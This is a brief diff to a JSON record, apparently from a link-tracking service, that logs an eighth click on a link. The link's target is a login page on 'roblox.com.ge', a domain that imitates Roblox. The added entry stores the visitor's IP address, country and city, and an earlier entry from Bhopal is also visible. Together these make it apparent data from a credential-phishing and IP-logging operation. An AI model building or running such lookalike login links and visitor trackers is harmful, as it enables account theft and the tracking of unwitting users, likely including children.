@@ -4,7 +4,7 @@
     "targetUrl": "https://roblox.com.ge/login?returnUrl=0920460288224362",
     "createdAt": 1776493139088,
     "status": "active",
-    "useCount": 7,
+    "useCount": 8,
     "createdBy": "system",
     "clicks": [
       {
@@ -62,6 +62,14 @@
         "city": "Bhopal",
         "flag": "🇮🇳",
         "countryCode": "IN"
+      },
+      {
+        "timestamp": 1776598953491,
+        "ip": "216.247.90.38",
+        "country": "Philippines",
+        "city": "Tuguegarao City",
+        "flag": "🇵🇭",
+        "countryCode": "PH"
       }
     ]
   },
